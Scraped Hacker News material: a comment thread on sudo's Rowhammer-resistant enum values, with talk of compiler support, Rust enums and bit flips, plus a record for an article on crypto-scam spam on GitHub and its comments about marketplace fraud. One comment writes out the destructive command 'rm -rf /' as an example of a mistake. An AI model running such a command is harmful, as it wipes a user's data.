feel like the Unix/Linux security model is broken. [0]: https://cedwards.xyz/sudo-is-broken/ reply KerrAvon 8 hours agorootparentI’m not following your logic. How does the malicious-but-unprivileged user have write access to anywhere in the sysadmin’s PATH? reply cedws 3 hours agorootparentThe 'exploit' runs under the sysadmin's user. It gets there when the sysadmin inadvertently installs something malicious under their own user, or something they're running is exploited for example. reply _visgean 11 hours agoparentprevHaha I have done exactly that as a joke in highschool https://github.com/Visgean/fakesudo reply zaroth 6 hours agoprevThis got me thinking - why we live with rowhammer and how do you take it seriously. This is such a crazy hack to get some protection around key variables - by requiring 32-bit manipulation. Why isn’t this just “done” on the phy layer, or somehow detected automatically in-flight? Does the compiler protect against it? At what performance penalty? It’s really much nicer just not thinking too much about it and going on believing our bits. reply foota 19 hours agoprevFeels like a language with opaque enums and pattern matching could implement this kind of thing behind the scenes. reply kazinator 14 hours agoparentOnce you assign the values in the C enum, a switch statement is \"opaque\". Just inefficient; a jump table optimization is impossible on the values. Speed is sacrificed for security. A jump table itself could be row-hammered to jump where the attacker wants! reply nraynaud 19 hours agoprevInteresting it’s the exact opposite of Gray code’s goal, I suppose this has been studied, with fixed size words maximal distance problems are tractable. reply rcthompson 20 hours agoprevCouldn't compilers be configured to use such values for for any enum type? And maybe even auto-insert the appropriate check in the final unchecked else anywhere that enum type is otherwise exhaustively checked? reply loeg 17 hours agoparentThe problem with C and C++ is that enum values are explicitly incrementing, even when the user does not specify a literal value for each one. So if anything depends on a specific value (e.g., disk or network formats), this will break it. I think Rust enum values are similar, but I'm not a language expert. reply fl0ki 14 hours agorootparentRust enums are incrementing too so that they can generate machine code with dense jump tables. If you also want the discriminant value for something, you opt into that with e.g. #[repr(u8)] and you can even override the values. Note that unlike in many other languages, casting from a number to the enum is a falliable operation because not all values are valid. Making something like this into a panic is not a good fit for Rust as-is. Because enums are proven to have only correct values, not only is code written to assume pattern matches cannot panic, but compilers are free to optimize around only having valid values as well. That goes not only for the enum discriminant, but for any associated values being properly initialized values of their respective types. In a sense, Rust lets you write code as if invalid values never happen, so there's less to check for in your code. It's understandable from the perspective of the abstraction needed for computer code to be \"correct\" and not just temporarily getting away with Undefined Behavior. There are simpler ways to violate it than just rowhammer, write straight to process memory for example, which can also violate invariants that compilers assumed while optimizing. If you wanted to compile Rust (or anything else) with a hardening mode that does check what should be redundant values, it would be a lot slower and code that never panicked before would now panic, but it would probably be a worthwhile tradeoff for some programs to opt into. After all, if you built for CHERI or arm64e and got a machine exception from an unauthenticated pointer, you'd be thrilled you mitigated a vulnerability even if it violated your higher-level language model. Defense in depth and all that. Maybe someone feels motivated enough to write an RFC and prototype for this. It just wouldn't stop at enum values, it should mean all sorts of other things too, such as not eliding any other checks that appear redundant given assumptions like immutability. That's what makes it slow and hard to reason about. reply kazinator 14 hours agoparentprevYes; gcc and clang could, in principle, support an extension like: __attribute__((rand)) enum e { FOO, BAR, ... }; which randomizes the values, as an extension. You only need this in specific places, like setuid programs. Randomization can be bad because it wrecks build reproducibility; it would have to be tied to the GNU Build ID. If such an enum is used in any interface between files, the randomization has to be the same in every translation unit. Maybe the syntax could specify a seed: rand(42). reply jmprspret 8 hours agorootparentA comment in the commit notes that randomisation does not necessary mitigate the issue. Which is why only a couple of the values are random, with the others being those values, XOR'd with 0xff* reply f_devd 19 hours agoparentprevYes it's possible, but it's not desirable. It wouldn't be backwards compatible, and not safe for shared libraries. It's better suited for a linter-type error/warning. reply andrewaylett 19 hours agorootparentIt's not plausible in C, for the reasons you mention, but it might be more possible in other languages -- Rust, for example, only guarantees specific representations when instructed and doesn't allow for shared libraries without a specified representation, so it wouldn't have either issue for most application code. Dynamically-typed languages similarly should be able to choose enum values at runtime in many cases. reply rcthompson 19 hours agorootparent> Dynamically-typed languages similarly should be able to choose enum values at runtime in many cases. I wonder, is choosing random enum values at runtime more secure against Rowhammer than just having fixed values that were chosen randomly once and compiled in, since presumably the attacking code now has no way to know which bits it needs to flip? If so, it might even be desirable to implement this as a \"secure enum\" in a compiled language. reply mcculley 18 hours agorootparentFrom the commit: “The values used were chosen such that it takes a large number of bit flips to change from allowed to denied. Using random values doesn't really protect against this attack.” It would be neat to see an algorithm that generates suitable values. reply f_devd 17 hours agorootparentThe basic algorithm for the 2-enum case from the commit seems to just be `enum { A = rand(), B = ~A}`. Although I'm not sure if it's optimal, the many case seems to be the same as the 2-case but repeated for every 2 items. I expect they double checked that the amount of bitflips is still pretty high. Maybe a better algorithm for the many case would be something like the popcnt parallel patterns: * 0b0101010101010101 * 0b0011001100110011 * 0b0000111100001111 * 0b0000000011111111 Since they would all have equal hamming distance between each of the entries. reply tomsmeding 16 hours agorootparentThe n=2 case also occurs in the commit: https://github.com/sudo-project/sudo/commit/7873f8334c8d3103... And indeed, the two values ate bitwise complements. reply mcculley 17 hours agorootparentprevYeah, I was specifically wondering about n>2. Your approach seems reasonable. reply kazinator 14 hours agoprevSomeone in a comment suggested ... > gcc -DRND1=0x$(openssl rand -hex 4) ... That would cause grief to reproducible distro initiatives. It is perfectly good enough for the error code enumeration to be statically randomized into hard coded constants. The attacker is very unlikely to flip every single bit of one valid value so that it resembles another valid value. Even if the values were randomized at compile time, if the executable is readable to the attacker, the attacker can learn what those values are. If the executable is not readable to the attacker, the attacker can just pull a copy of the executable from the distro package: executables are installed from widely used binary packages, not freshly compiled for every system. reply thulle 11 hours agoparent> It is perfectly good enough for the error code enumeration to be statically randomized into hard coded constants. A comment points out that they aren't randomized: > The values used were chosen such that it takes a large number of bit flips to change from allowed to denied. Using random values doesn't really protect against this attack. reply eth0up 10 hours agoprevMoron disclaimer: I may not be one entirely, but I frequently emulate one. As a full-time Linux user, I haven't used sudo for years. Rather, I do 'su root'. However, I noticed several years ago (Debian) that upgrades would iterate twice, seemingly accommodating two accounts. Emulating a moron as I do, I never exerted the effort to learn why. I simply began, after 'su root', entering 'sudo su', which despite always having sudo disabled, seems to make me proper root. I'll often use synaptic package manager when I want a cleaner, easier interface to explore packages. If I only 'su root' it won't open unless I append .... something similar to 'pkex' to the end, but if I do 'sudo su', I can run it using only 'synaptic'. Regardless, I refuse to use sudo otherwise, even when I'm emulating something sentient. Be afraid. There are morons using Linux, and some are quite productive despite. reply poizan42 10 hours agoparentYou should use 'su - root' to get a root login shell. Otherwise you will still keep your old environment, including $HOME and $USER. (The man page recommends using --login over the single dash, but it also says they are equivalent. Maybe I'm too much of a moron to understand the difference, but the single dash is less typing) reply TheAdamist 19 hours agoprevIs there any reason for the void cast here? Theres no return value in use. (void)strlcpy(des_pass, pass,sizeof(des_pass)); reply mandarax8 19 hours agoparentstrlcpy returns a size_t, so just to silence the discarded return value warning https://linux.die.net/man/3/strlcpy reply loeg 17 hours agorootparentSure; it's just irrelevant to the diff's logical change. reply azinman2 18 hours agorootparentprevI had the same q! Perhaps a comment would have helped given the context for the PR. reply trebligdivad 20 hours agoprevHaving to code like this everywhere would be hell! Scroll to the top for the reference to the Mayhem attack it's trying to guard against. reply SkyMarshal 14 hours agoprevDoes anyone have any opinions on doas vs sudo? I've heard doas recommended as being more minimalistic, and various advantages that brings. What are the pros and cons between the two? reply charcircuit 12 hours agoparentMy opinion is to have neither. Requiring users to switch to an account that has different privileges is evidence of poor design of the operating system. Having a root user who has full privileges over the entire system is also poor design as it is the opposite of the principle of least privilege. If a user has the privilege to do something they should be able to do it with their normal account. reply forty 11 hours agorootparentI'm happy that my mistakenly typed rm -rf / fail when I use my non root user (normal account) even though I also have root for when I do want to mess things up. reply kzrdude 15 hours agoprevWhen do these values get into memory, shouldn't they be in registers generally? Maybe it's when the program loaded to memory to execute, but is that part rowhammerable? reply asah 16 hours agoprevI wonder how this might work with bit-dense systems (e.g. databases like PostgreSQL) where every bit has meaning and it's wildly impractical to reassign bitpatterns like this. reply jesprenj 16 hours agoprevGood job, though it doesn't really help when you have a buffer overflow leading to RCE in a suid binary (remember sudoedit CVE?) reply 4gotunameagain 20 hours agoprevSeems like an interesting compiler level protection, a decorator for enums so that they are compiled to values with maximum hamming distance between them. reply frozenport 14 hours agoprevReally struggle to understand the thread from Rowhammer. It would seem to be particularly dangerous, but then I don't see everybody getting pwned. reply dist-epoch 16 hours agoprevEven without an explicit attack, today's memory is pretty fragile, I'm regularly seeing bit flips. reply PrimeMcFly 13 hours agoparent> I'm regularly seeing bit flips. How? reply dist-epoch 11 hours agorootparentFor example 7zip decompression CRC failures that resolve on a second try. It would be longer to explain how, but I tracked it multiple times to a single bit flip in the decompressed output. reply TillE 10 hours agorootparentI've also seen that, often enough that a hardware issue is extraordinarily unlikely. It's almost certainly just a boring old software bug. reply PrimeMcFly 10 hours agorootparentprevThanks, that's pretty interesting. I'd actually be really interested if you would care to explain how, I think others would find it interesting also. I'm not even sure how I would approach trying to do that. reply formerly_proven 19 hours agoprevtfw hardware becoming so unreliable people start using 32-bit maximum distance codes for enumerations with like four values. reply defrost 19 hours agoprevThis wikipedia article must surely be inaccurate: https://en.wikipedia.org/wiki/Row_hammer The initial research into the row hammer effect, published in June 2014, described the nature of disturbance errors and indicated the potential for constructing an attack, but did not provide any examples of a working security exploit. [1] [1] (June 24, 2014). \"Flipping Bits in Memory Without Accessing Them: An Experimental Study of DRAM Disturbance Errors\" By my recollection there was a discussion of rowhammer and making it work on a (original) Freenode channel circa 2010 (or earlier) in response to a related thread on a reddit security hacking subreddit. ie: it was being discussed in public channels some four years prior to a paper cited as \"initial research\". Addendum: Mind you, lots of things get kicked about and implemented before actual papers appear on them for the first time in public. reply rcthompson 19 hours agoparentWell, that quote from Wikipedia says the published paper didn't include a working exploit. That might be true even if a working exploit was available after the paper was written and submitted but before it was published. (I don't know if this is the case here, but this sort of thing is common in scientific publishing.) reply defrost 8 hours agorootparentTo clarify: Mind you, lots of things get kicked about and implemented before actual papers appear on them for the first time in public. I was thinking of many examples I know where a technique is developed and used in industry (mineral explorationremote imagingsecret spook stuff) and much later (five years or more) gets a first mention in acedemia .. where they may or may not get a robust working version happening .. just a rickety proof of concept. reply xgk 11 hours agoparentprevThe possibility of flipping bits in DRAM in a Rowhammer like fashion, was known in the DRAM industry since at least the 1990s (sorry, no reference handy), and Rowhammer-like access was used in DRAM quality testing. As silicon density increased, the issue became more urgent. reply defrost 8 hours agorootparentThat matches my recollection- I started in broad STEM at university in the 1980s and as chip sizes were pushed smaller and denser there was always thought given to signal bleedharmonics from too many lines too close together. I suspect \"observed in fabrication labnot disclosed\" dates back some years before the paper .. once observed there's always a path to exploitation - but why would anyone broadcast that? By the time it was chit chat on IRC the general feeling was that some TLA has a working exploit. (obviously unpublished). reply kator 19 hours agoprev [9 more] [flagged] umanwizard 19 hours agoparent [–] Rust makes a particular class of bugs harder to write. That’s it. It doesn’t magically eliminate all bugs. “Susceptible to rowhammer” is not in the class of bugs that Rust helps with. No experienced Rust programmer actually believes it magically prevents all bugs or magically makes security-sensitive code immune to side channel attacks, so I don’t think anyone is being lulled into a false sense of security, no. reply delusional 19 hours agorootparent [–] What about the Non-experienced Rust programmer? A lot of open source code are written by inexperienced people who understand the nuances of computer science primarily through hype. I think those are the kinds of people OP was asking about. reply umanwizard 17 hours agorootparentAn inexperienced programmer is much more likely to make security-critical mistakes writing C or C++ than Rust anyway, even if they’re aware of the concept of undefined behavior, so I think Rust still has an advantage in this case. You should avoid using security-critical tools written by people who don’t understand security, regardless of language. reply Waterluvian 19 hours agorootparentprevThat’s not a rust problem. Misunderstanding and misusing a tool is an inexperienced person problem. It’s one thing you pay veterans more for. reply IshKebab 19 hours agorootparentprev [–] I don't think there are going to be a large number of inexperienced Rust programmers. Inexperienced programmers write Javascript or Python, not Rust. reply randomdata 16 hours agorootparentYet the vocal majority of Rust users present themselves as being inexperienced programmers. I expect it is not just an act – that the vocal majority truly are inexperienced, and I expect the segment of users who are novices is much larger than you suggest. The fact of the matter is that the novices have always been drawn to the 'hot new technology' and it is unlikely that Rust, being today's 'hot new technology', is the exception. Indeed, Python and Javascript had time in the sun when they were considered hot, and novices were attracted in that direction at that time, but time continues to march forward. reply IshKebab 1 hour agorootparent> the vocal majority of Rust users present themselves as being inexperienced programmers No they don't. reply odyssey7 18 hours agorootparentprev [–] Some novices do in fact write Rust, just like how many of them gain experience in C and C++ during undergrad. With any luck, universities will adopt something safer like Rust… reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "The sudo project has implemented updates to improve security against ROWHAMMER attacks.",
      "These changes involve modifying variables and adding tests for expected values.",
      "The updates were prompted by a report from researchers at Worcester Polytechnic Institute and primarily impact files related to authentication, session management, and conditional statements."
    ],
    "commentSummary": [
      "The discussion covers a range of topics related to computer vulnerabilities and programming optimizations.",
      "Some of the topics discussed include the vulnerability of the sudo program to Rowhammer attacks and the optimizations of binary codes.",
      "Other topics include the use of Minecraft and Source Engine game server hosts, mitigations of Rowhammer attacks in DRAM chips, the importance of ECC memory, alternatives to sudo like doas, the use and security implications of enum values in programming languages, and the occurrence of bit flips in data decompression."
    ],
    "points": 163,
    "commentCount": 115,
    "retryCount": 0,
    "time": 1706447350
  },
  {
    "id": 39170622,
    "title": "GitHub Faces Surge in Spam; Users Call for Improved Reporting and Content Moderation",
    "originLink": "https://djanes.xyz/spam-on-github-is-getting-crazy-these-days/",
    "originBody": "GitHub Spam is out of control GitHub Spam is out of control January 28, 2024 Spam is nothing new, spam on GitHub is also not particularly new. Any site that accepts user-generated content will need to figure out how to prevent people from submitting spam, whether that is for scams, malicious software, or X-rated material. I have been getting tagged in Crypto related for the past 6 months or so. In the past 24 hours I have been tagged in two of them. Normally, these crypto scams on GitHub post and tag multiple people in it, and then almost immediately get deleted by the poster of the scam. It appears that this is a way to bypass spam filters, or at the very least make it harder to report them. According to this post on GitHub’s community org, the end user gets an email with the full post and spam, but there is no easy way to report it since it is already deleted. The Issue Today, though, was my “lucky” day. I got tagged in two scams, but one of them is still up! So let’s take a look into it. As we can see in the screenshot above, there is a copy and paste message from a seemly auto-generated user and a bunch of real users tagged below as “Winners”. The full pull request can be found here: https://github.com/boazcstrike/github-readme-stats/pull/1 (Archive.org Link) Let’s do a little experiment and search for the title of the comment on GitHub and see what we get: https://github.com/search?q=AltLayer+Airdrop+Season+One+Announcement&type=pullrequests (Archive.org Link) That is 274 comments on pull requests and 545 comments on issues. Over 800 spam comments (819 to be exact). To be fair, I saw a couple of false positives in this search, but VERY few since this is a very specific and long term we searched up. Assuming that 95% of them are correct matches, then that is ~780 posts. The REAL kicker in all of those pull requests and issues I could find, I could only find one’s that was 24 hours or newer. The oldest I could find is only 18 hours ago from the time of writing this article! Each post has up to 20 users tagged in it. I do not know if this is a GitHub imposed limit or if they might get flagged easier if they tag more than 20 accounts. ~780 posts * 20 = 15,600 accounts tagged. As I was finishing this article, I found another set of these with the title of “Binance Airdrop Guide: $500k Worth of Airdrop is Ready, here’s how to Claim”. Another ~800 mentions of it. The interesting thing with this one is that some of these are over 1 month old! There are even 3 spam posts on 1 pull request, tagging 10 users each! https://github.com/varathsurya/nurse_management_api/pull/1 (Archive.org Link) So that is another ~15k accounts tagged… We are 30k accounts tagged so far, lets look at who is doing the tagging for the most part. Here are a few accounts I found: https://github.com/devsquadcore (Archive.org Link) https://github.com/mohamedata-code (Archive.org Link) https://github.com/altagencyuk (Archive.org Link) They seem to have a lot of similarities. 1) No profile picture 2) A couple of years old, but usually no commits and no repos 3) If they do have a repo(s), it’s a 1 commit thing usually of some open-source software (1 account had 4 repos of Laravel, and one had 1 repo of wordpress). WTF Quick side note: How the actual fuck does GitHub NOT have a report button on a piece of user generated content. Do you know the process of reporting this? Copy Link -> Go to user’s profile page -> Click Block & Report -> Click Report Abuse button -> *New page* Click “I want to report harmful… cryptocurrency abuse” -> Click “I want to report suspicious cryptocurrency or mining content.” button -> FINALLY paste the link you copied 10 years ago into the form box and give your justification on why this user did a bad thing and hope that the link still works/content is still up by the time they get around to looking at it… That is 7 different steps on 3 different pages with multiple models/dropdowns… Come on, that is WAY to much. I have never reported these before because it was too much work, I legit gave up and just ignored it because I knew it was a scam and wasn’t going to fall for it. IF YOU WANT YOUR USERS TO HELP YOU, MAKE IT EASY FOR THEM! *Sorry, had to get that off my chest. It always seems that Trust and Safety UI/UX things like that are give little time and thought because they are not the cool sexy and flashy features that users see or care about most of the time…. until the spam starts! The Fix So what can be done about this? What can GitHub do? I have a couple of “simple” ideas. I say simple because I realize that not only is user-generated content moderation an uphill battle, but doing it at scale adds another level of complexity to it all. If a user is posting multiple comments in a relatively short period of time (lets say a day), have some system that checks to see if it’s a 95% copy and paste to all of their other issues? Ok, this could snag some real users who, say, use templates in their PRs or issues. Fine, there must be some way to rate that account on a number of other factors and their past activity. If they have no repos, no commits in any repos (public or private), no profile picture, no bio, no SSH keys, etc etc, and all they are doing is making comments…. That is a lot of red flags to me personally. Another “simple” idea, is to compare comments site wide with each other. They are using the same heading, same body, same image, same links, and just checking who they are tagging. That is a pretty big red flag for me as well. Also, tagging 20 people (even 10 people) at a time can be a red flag. Maybe not once or twice, but if they do it multiple times and always to different users, then that should trigger something to prevent them from posting. Conclusion With the rise of generative AI and ChatGPT being able to write endless variations of 1 spam template to bypass the similarity check I just proposed above, content moderation will continue to be an uphill battle. It most likely will get even harder! I am a bit surprised though about GitHub’s, seemingly, lack of ability to handle this sort of spam. I am 100% sure (no proof, though) that intelligent people are already working on this at GitHub, but it’s a clear that they need a concrete plan moving forward. They need to put some real effort into it. Hell, train some AI to auto-filter or auto-rank comments before they get posted. If there are too many red flags, then hold those comments for human moderation before letting it be posted. Spam is nothing new, and I am sure that spam on GitHub is nothing new, but it seems to be getting worse and the only thing getting better are the spammers.",
    "commentLink": "https://news.ycombinator.com/item?id=39170622",
    "commentBody": "GitHub Spam (djanes.xyz)142 points by bl4ckneon 11 hours agohidepastfavorite85 comments jessriedel 10 hours agoI had a disreputable eBay seller use a similar trick: The Apple product they sold turned out to be counterfeit (unbeknownst to them, they claimed), so they took down the original eBay listing. For some reason, eBay prohibits you from leaving feedback for sellers on orders from listings that are taken down in this way. So this seller still has like 99.7% positive feedback and continues operating even though they at best wasted the time of dozens/hundreds of people who received counterfeit goods and either didn't notice or had to fight for a refund. reply tiew9Vii 10 hours agoparentHad an eBay seller sell me refurbished hard drives as brand new. I purchased new Western Digital Red 5k, they sent refurbished 10k enterprise drives with 5k stickers. High 99% feedback, large numbers marked as sold. Ok contacting the seller saying I got refurbished drive with the reported drive stats I got abusive phone calls saying they have my address, they don’t sell fakes, they are going to come to my house and teach me a lesson calling the drive fakes. Turned out the registered address was 2000 km away at some random suburban residential address, the person on the phone had broken English phoning from a Thai phone number so I wasn’t to worried about that and laughed it off and said good luck. I contacted eBay, left a poor review saying received fake goods, got threats of violence from the seller. eBay refunded my money and a week later my review was removed for the seller to continue scamming customers which must be many by the items sold and number of reviews. I ignore positive reviews now. They are curated so not worth any substance if bad reviews get removed. reply gusgus01 10 hours agorootparentFunny enough that sounds really similar to the actions of the CEO and others at Ebay: https://www.reuters.com/world/us/ex-ebay-exec-heading-prison... So it's not that surprising that they allow it on their platform. reply asdefghyk 6 hours agorootparentprevRE \"......the person on the phone had broken English phoning from a Thai phone number......\" Probably a person that works at the hard drive factory IN Thialand. Hard drive capacity reduced in this way when part of the drive has a problem. Maybe its a warranty return. I would complain directly to Western Digital . If the problem was detected at factory, most likely it never would have had a 10K sticker put on .... reply _puk 10 hours agoparentprevI've had similar on Amazon.. Next day delivery.. you pay, it ships, then delivery estimate gets an \"oops you're delivery had a problem and has been rescheduled for 6 weeks in the future\". Can't refund as it has been shipped, and the original listing disappears after a couple of days \"listing not found\", so no feedback possible either. reply at_compile_time 7 hours agorootparentThe last thing I bought on Amazon was a potato peeler. Instead of the quality European peeler I paid for, I received a cheap Chinese peeler that bent the first time I tried it. No returns allowed because the item was considered \"dangerous\". You'd think that a consistent customer would be worth more than $30, but apparently not to Amazon. They wouldn't make it right so I shop elsewhere now. reply latchkey 5 hours agorootparent> No returns allowed because the item was considered \"dangerous\". If you have prime, talk to customer support until you get the answer you want to hear. In general, they have been extremely supportive of all the various issues I've run across, but then again, I buy a lot of stuff from there. reply gs17 3 hours agorootparentprevThe other reply was my experience too. Ordered a large box of a food product, arrived expiration date the same week (technically a best by date, but I doubt it would be good by the time I finished all of it). The site said no returns on food, contacted support, got a chatbot that told me the same. Went through to a person and they credited my account. reply nirvdrum 9 hours agoparentprevIt sounds like Facebook Marketplace. I bought counterfeit AirPods Max. They showed up as legitimate in the phone so I thought they were good, but they were fake. Before I realized what happened the seller blocked me, which apparently prevents leaving feedback. I contacted Facebook about the fraud that went into a black hole. I had found someone else scammed by the same seller and I was annoyed enough to go to the police. The police called it a civil matter and refused to do anything. Obviously I didn’t have the seller’s real name so I couldn’t pursue that angle. I saw from another Facebook account that the seller is still hawking counterfeit goods. So, I guess that’s effectively legal. reply themoonisachees 9 hours agorootparentSale of counterfeit goods is a crime in most jurisdictions, it's just that the police are useless in all of them. reply pierat 7 hours agorootparentprev> The police called it a civil matter and refused to do anything. You're a \"little guy\". You're not \"business\", \"landlord\", or government\".. So your actual rights don't matter. Put it differently, the very pigs who are hired to do \"law and order\" explicitly told you that your rights don't matter. reply Mistletoe 10 hours agoparentprevThe ridiculous thing I learned recently is that negative EBay feedback falls off after 12 months. Helped explain why I keep buying things from 100% positive feedback sellers and receiving broken junk… reply tomjakubowski 10 hours agoparentprevDid the seller refund you? reply jessriedel 7 hours agorootparentThe seller tried to only refund half the purchase amount because I didn't have the original box it was sent in. (I threw the box away before I realized the item was counterfeit.) I had to appeal his partial refund to eBay, who agreed with me that if someone sells you counterfeit crap they have to fully refund you even without the box. After exchanging several emails with the seller, it was clear that he believed that as long as he gave refunds when people sent everything back to him in mint condition, he had done nothing wrong and did not deserve to have his reputation damaged. The problem with that, obviously, is that he wasted the time of dozens/hundreds of people, and defrauded people who did not notice the item was counterfeit. (People only got refunds if they noticed and requested; they were not automatically told they could get one, as an honest seller would have done.) Under the current system, sellers face little incentive to make sure they aren't unwittingly acting as a fence for stolen/counterfeit good. Without reputational hits, they only have to reimburse buyers for the purchase price, not for the time wasted, and many/most buyers won't bother to return it anyways. reply hobofan 10 hours agorootparentprevWhat does it matter? reply albertzeyer 10 hours agoprevOn those simple ideas to fix it: I don't think it's simple. Once you do simple heuristics, the other side will start doing it just a little bit more sophisticated, to get around the simple heuristics. So, then you improve the heuristics to catch the spammer. And again, the spammers get around that improved tests as well. And so on. In the end, you end up with similar spam filter methods as we also have for mails and probably as other social networks have as well. But this is far from simple. I don't think having a huge number of hand-crafted heuristics is really a good solution. I think it should be machine learning model which you train and it does it all automatically without too much false positives (and also not too much false negatives). reply worldsayshi 10 hours agoparentI think issues like these will continue along the path you describe until we tie authorship to real humans and their reputation, or perhaps something else they care about, in one way or another. I'm not saying that we should give up on the idea of anonymity on the internet, at least not completely. But real humans have to put something at stake when they use space on any part of the internet that other humans should care about. reply anticorporate 10 hours agorootparentI've participated in plenty of communities without spam problems where I have no idea of the real identity of the other participants, and neither does anyone else. I can't help but note that neither of us attach our real identity to our participation here. I think a better solution might be structural. In this GitHub example, why can someone tag people who they're not collaborating with to begin with? Why are identities so easily discoverable and contactable? The value seems to far outweigh the risk. reply worldsayshi 9 hours agorootparentI hope there are other ways. Although I suspect that the communities you're thinking about are somewhat niche? I guess that would only motivate a small amount of investment for setting up spambots and a little resistance is enough to move on. If this explanation is not enough I also wonder what the explanation would be? I also suspect that the barrier for spamming absolutely everywhere is going to get lowered as soon as somebody figures out how to make LLM:s configure spambots for arbitrary domains? reply internetter 9 hours agorootparent> Although I suspect that the communities you're thinking about are somewhat niche? Reddit, for instance, in my experience, has been remarkably spam bot free, though the dead internet theory is very prevalent in culture there reply kdowns 3 hours agorootparentprevA one time administration fee for account creations would make most of these spam tactics unprofitable. People are probably too used to having everything for free online (paid for by ads) for anyone to try this right now. reply bl4ckneon 10 hours agoparentprevAuthor/OP here: ya \"simple\" is a relative word and I tried to address that with a few sentences around it. Didn't want to come across as an \"internet arm chair expert\" since I don't have a lot of experience in at scale content moderation. On the other hand, I don't think posting the same spam nearly 1k times in 24 hours shouldn't raise some sort of alarm. 1 manual take down of a spam by a human should trigger a search (or have an option) to trigger a search through recent comments to see ones that are close. If I can search their whole site in 3 seconds they should have some sort of system that looks for 95% simular comments. Seems simple but I am sure it's actually much much harder and has caveats and gotchas along the way as it scales. reply eek2121 9 hours agorootparentI mean, you suggest using AI to scan comments/code. Maybe think harder and don't avoid a certain tech that is in a bubble and may soon be sued out of existence. I do agree, github and other places that allow user generated content need to do a better job. I have more bots than humans following on twitter (and I have thousands of followers), for example, however trying to say \"AI CAN FIX IT\" won't win you any favors. FYI I have a suggestion, maybe spin up said AI model on AWS and try scanning all the comments/issues github receives in a day. When even Microsoft can't pay your bill, you'll see why they do not yet use AI for that...though I'm sure they will try eventually. reply 22c 10 hours agoparentprevYes it's a game of cat and mouse, but starting out with a defeatist attitude, the cat makes things way too easy and the mice will simply roam free. Making life hard for the spammers can and will get rid of all but the most persistent. The other issue I have with this particular GitHub spam is the notifications persist even after the spam has been removed. You get notified and subscribed to some random thread because you were previously tagged in it. After GH removes the spam (which is currently too slow) they should also retract any notifications or subscriptions that were made as a result of the spam comment. reply RegnisGnaw 10 hours agorootparentHow does that work with email? reply manquer 10 hours agorootparentI think he means the notification model . You can disable email notifications, you cannot disable the notifications model . reply 22c 9 hours agorootparentThat's right. If you login to to GitHub even days after the spam is removed, you will see the bell icon with a notification about a since cleaned up thread in your feed. reply mschuster91 10 hours agoparentprevThe fix isn't ever more heuristics - that is an uphill battle that can't ever be won. The fix is following the money and disconnecting the bad actors' ISPs from the Internet. There was a time when abuse@ emails were honored and administrators actually took notice of what came in, but these days are long since gone - ISPs simply don't want to spend the money, and so the cost of abuse is externalized to society at large. ETA: Also, a fix would be to have a human with more than ten seconds time take a look at even 1% of spam reports. Spammers are lazy, they always use the same template, so if you have a human actually looking into the template and then routing every match to /dev/null, it's far more effective. Like... I can do this on Twitter for every new variation of some scam, why can't Twitter do it on its own?! reply arp242 10 hours agorootparentDo you really want ISPs to be in the business of deciding what should and should not be on the internet though? That sort of thing typically doesn't work too well. Deciding what is or isn't a \"scam\" is really a job for the independent judiciary. But getting a ruling is difficult and time-consuming, and also largely pointless because a new website can be created almost instantly, and there are many foreign ISPs where you can't get a ruling at all. I don't really disagree with your basic premise that \"disconnecting the bad actors' ISPs from the Internet\" is the ideal solution, but this is far more difficult than your comment implies – almost impossible with how the internet currently works. reply gerdesj 10 hours agorootparentWe are oh so close to a balkanised internet. Thankfully, the powers that be outside of CN, RU and a few others haven't really gone to town on buggering up basic connectivity, yet. reply Eisenstein 10 hours agorootparentprevI think that the parent comment was referring to the days when ISPs were local or network services were provided by a school or a some other entity which had a vested interest in keeping their network clear of bad actors. reply __MatrixMan__ 10 hours agorootparentprevThe fix is to give users the tools to lean more heavily on transitive trust and less heavily on the platform. Or we build those tools ourselves and let the platforms be dumb pipes which we selectively slurp from. The days of trusted-by-default banned-selectively are ending. It's dark forest time. reply servercobra 10 hours agorootparentprevThis ignores that botnets, malware, etc exist. reply mschuster91 3 hours agorootparentWell, ISPs can hold their customers accountable as well. Get told you're running malware, you got 24h to get it fixed, or you get disconnected. reply zdw 10 hours agoprevAh, this is actual spam as comments... I have a different problems - Github's notification settings are far too coarse, and if you're either subscribed to lot of repos, or have a lot of actions happening on those repos the flood of email messages you get on every comment or action a person or a CI process takes is just unmanageable. All I want is \"If someone (ie, not a bot) specifically tags me on a PR where the CI is passing, send email once\". This granularity unfortunately doesn't seem to be possible - that said, I would love to be wrong about this. I ended up turning off Github's email notifications for this reason, as the signal to noise is horrible. reply rob 9 hours agoparentTry having a generic username on there where everybody @s you as a shorthand for the real person's username and you end up getting notified. Or added to random repos and removed minutes later, but still getting the notification. :) reply mtlynch 8 hours agorootparentI recall a HN user whose GitHub username was some common word related to software development (like @deploy or @prod, but I can't recall the right name). There was a thread about six months ago mentioned that they get @'ed constantly by mistake. They had a funny attitude towards it, though. They said they always enjoy getting to see what everyone else is working on and didn't mind the notifications. If anyone remembers what I'm talking about, let me know because now I'm so curious about this username I can't remember. reply jstrieb 6 hours agorootparentAre you thinking of @reset? https://discuss.systems/@adrian/110783401400871208 https://news.ycombinator.com/item?id=36888444 reply kypro 9 hours agoparentprevI have the exact same problem, but I assumed I was too stupid to work out how to configure Github to stop this and didn't want to waste any more time trying to work it out so I just turned the emails off. I work for a fairly large org with lots of Github repos which I occasionally contribute to and there seems to be no way to configure emails alerts in a manageable way – I must either get an email for everything or ignore everything. And ignoring everything is obviously preferable when the signal to noise is this bad. reply zdw 9 hours agorootparentSounds like the same problem! I'm working at a large org, was involved in setting up lots of repos, therefore I end up getting pinged on so many of them that I'm no longer directly working on or directly interested in. There's also not a bulk method anywhere (that I can find) in Github that can deal with unsubscribing or changing settings on many repos at the same time. reply iBotPeaches 10 hours agoprevI concur - I saw the React Native repo getting spammed with hundreds of similar issues/prs. So many unique usernames and such a cumbersome process to report a painfully obvious spam account. I hit the limit of open abuse reports you could have. My attempt to help was ended - I was only 4 accounts in. Thought I would get creative and add comments to one of my existing reports of the other 10 or so spam accounts. The tickets were closed and only the main account was deleted - not the others mentioned in the ticket. So I gave up. reply firtoz 2 hours agoparentI find it so ironic that you have a cap on abuse reports... reply Sparkyte 10 hours agoprevInternet is 5% useful important stuff and 95% spam. When a more intelligent organism finds our planet they will be so confused why we wasted so much digital space on senseless spam. reply crazygringo 10 hours agoparentI think a more intelligent organism will understand perfectly that it is explained as the inevitable result of combining virtually free message-sending with simple economic self-interest, and why there are no perfect solutions to it (at least not yet). reply aspenmayer 8 hours agorootparentCapitalism is the crisis? https://en.wikipedia.org/wiki/Capitalist_Realism reply ta8645 10 hours 